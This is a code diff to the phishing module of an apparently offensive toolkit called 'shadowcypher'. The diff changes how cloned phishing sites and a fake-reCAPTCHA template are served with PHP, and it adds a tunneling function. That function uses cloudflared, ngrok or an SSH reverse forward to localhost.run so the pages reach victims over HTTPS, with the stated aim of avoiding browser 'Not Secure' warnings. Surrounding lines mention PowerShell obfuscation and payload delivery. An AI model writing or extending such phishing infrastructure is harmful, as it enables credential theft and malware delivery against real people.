@@ -55,21 +55,43 @@ class Phishing:
             return f"ERROR: PS1 obfuscation failed: {e}"
 
     @staticmethod
-    def start_phishing_server(template, port=8080, on_output=None):
-        """Launch a professional PHP phishing server for the selected template."""
+    def start_phishing_server(template, port=8080, on_output=None, use_tunnel=False):
+        """Launch a PHP phishing server with optional HTTPS tunneling."""
         site_path = os.path.join("shadowcypher/modules/phish_data/sites", template.lower())
         if not os.path.exists(site_path):
-            # Fallback to general data dir if specific site not found
             site_path = "shadowcypher/modules/phish_data/fake-recaptcha"
         
-        logger.info("phish", f"Launching {template} PHP server on port {port}")
+        logger.info("phish", f"Launching {template} server on port {port}")
         if on_output:
             on_output(f"[PHISH] ACTIVATING_INFRASTRUCTURE: {template} on port {port}\n")
-            on_output(f"[PHISH] CWD: {site_path}\n")
         
-        # Use PHP built-in server for 100% functional ShadowPhish compatibility
-        cmd = ["php", "-S", f"0.0.0.0:{port}"]
-        return runner.execute_task(f"PHISH_{template}", cmd, callback=on_output, cwd=site_path)
+        # Start the local PHP backend
+        cmd = ["php", "-S", f"127.0.0.1:{port}"]
+        task_id = runner.execute_task(f"PHISH_{template}", cmd, callback=on_output, cwd=site_path)
+        
+        if use_tunnel:
+            Phishing.start_secure_tunnel(port, on_output=on_output)
+            
+        return task_id
+
+    @staticmethod
+    def start_secure_tunnel(port, mode="cloudflare", on_output=None):
+        """Secure the infrastructure with an HTTPS tunnel (Bypass 'Not Secure' warnings)."""
+        logger.info("phish", f"ENGAGING_SECURE_TUNNEL: {mode} (port {port})")
+        if on_output:
+            on_output(f"[STEALTH] INITIATING_HTTPS_TUNNEL: {mode.upper()}...\n")
+            
+        if mode == "cloudflare":
+            # Cloudflared provides free, automated SSL
+            cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"]
+            return runner.execute_task("TUNNEL_CLOUDFLARE", cmd, callback=on_output)
+        elif mode == "ngrok":
+            cmd = ["ngrok", "http", str(port)]
+            return runner.execute_task("TUNNEL_NGROK", cmd, callback=on_output)
+        else:
+            # Fallback to localhost.run via SSH
+            cmd = ["ssh", "-R", f"80:localhost:{port}", "nokey@localhost.run"]
+            return runner.execute_task("TUNNEL_SSH", cmd, callback=on_output)
 
     @staticmethod
     def generate_fake_recaptcha(payload, target_os="windows"):
